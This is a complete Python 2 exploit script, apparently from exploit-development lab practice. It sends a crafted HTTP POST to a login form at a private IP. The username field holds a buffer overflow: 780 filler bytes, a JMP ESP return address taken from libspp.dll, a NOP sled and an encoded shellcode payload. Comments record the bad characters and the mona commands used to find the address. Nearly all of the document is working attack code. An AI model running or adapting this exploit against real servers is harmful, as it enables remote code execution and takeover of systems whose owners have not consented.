#!/usr/bin/python
import socket, sys

target = "192.168.198.10"
port = 80



# \x00 \x0A \x0D \x25 \x26 \x3D 
# !mona modules
# !mona find -s "\xff\xe4" -m "libspp.dll"
# Log data, item 3  Address=10090C83  Message=  0x10090c83 : "\xff\xe4" 


try:
	print "\nSending buffer"

	payload = ("\xba\xb6\x54\x28\x38\xda\xcb\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\x58\xa8\xca\xcd\x58\xb9\x89"
"\x2e\xa0\x3a\xee\xa7\x45\x0b\x2e\xd3\x0e\x3c\x9e\x97\x42\xb1"
"\x55\xf5\x76\x42\x1b\xd2\x79\xe3\x96\x04\xb4\xf4\x8b\x75\xd7"
"\x76\xd6\xa9\x37\x46\x19\xbc\x36\x8f\x44\x4d\x6a\x58\x02\xe0"
"\x9a\xed\x5e\x39\x11\xbd\x4f\x39\xc6\x76\x71\x68\x59\x0c\x28"
"\xaa\x58\xc1\x40\xe3\x42\x06\x6c\xbd\xf9\xfc\x1a\x3c\x2b\xcd"
"\xe3\x93\x12\xe1\x11\xed\x53\xc6\xc9\x98\xad\x34\x77\x9b\x6a"
"\x46\xa3\x2e\x68\xe0\x20\x88\x54\x10\xe4\x4f\x1f\x1e\x41\x1b"
"\x47\x03\x54\xc8\xfc\x3f\xdd\xef\xd2\xc9\xa5\xcb\xf6\x92\x7e"
"\x75\xaf\x7e\xd0\x8a\xaf\x20\x8d\x2e\xa4\xcd\xda\x42\xe7\x99"
"\x2f\x6f\x17\x5a\x38\xf8\x64\x68\xe7\x52\xe2\xc0\x60\x7d\xf5"
"\x27\x5b\x39\x69\xd6\x64\x3a\xa0\x1d\x30\x6a\xda\xb4\x39\xe1"
"\x1a\x38\xec\xa6\x4a\x96\x5f\x07\x3a\x56\x30\xef\x50\x59\x6f"
"\x0f\x5b\xb3\x18\xba\xa6\x54\x2d\x3b\xaa\xab\x59\x39\xaa\xb2"
"\x22\xb4\x4c\xde\x44\x91\xc7\x77\xfc\xb8\x93\xe6\x01\x17\xde"
"\x29\x89\x94\x1f\xe7\x7a\xd0\x33\x90\x8a\xaf\x69\x37\x94\x05"
"\x05\xdb\x07\xc2\xd5\x92\x3b\x5d\x82\xf3\x8a\x94\x46\xee\xb5"
"\x0e\x74\xf3\x20\x68\x3c\x28\x91\x77\xbd\xbd\xad\x53\xad\x7b"
"\x2d\xd8\x99\xd3\x78\xb6\x77\x92\xd2\x78\x21\x4c\x88\xd2\xa5"
"\x09\xe2\xe4\xb3\x15\x2f\x93\x5b\xa7\x86\xe2\x64\x08\x4f\xe3"
"\x1d\x74\xef\x0c\xf4\x3c\x0f\xef\xdc\x48\xb8\xb6\xb5\xf0\xa5"
"\x48\x60\x36\xd0\xca\x80\xc7\x27\xd2\xe1\xc2\x6c\x54\x1a\xbf"
"\xfd\x31\x1c\x6c\xfd\x13")

	filler = "A" * 780
	eip = "\x83\x0c\x09\x10"
	offset = "C" * 4
	sled = "\x90" * 16
	shellcode = "D" * 1000

	inputBuffer = filler + eip + offset + sled + payload

	content = "username=" + inputBuffer + "&password=A"

	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "Host: 192.168.198.10\r\n"
	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
	buffer += "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Referer: http://192.168.198.10/login\r\n"
	buffer += "Connection: close\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+ str(len(content))+"\r\n"
	buffer += "\r\n"

	buffer += content
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target, port))
	s.send(buffer)

	s.close()
	print "Done"

except:
	print "\nCould not connect!"
	sys.exit()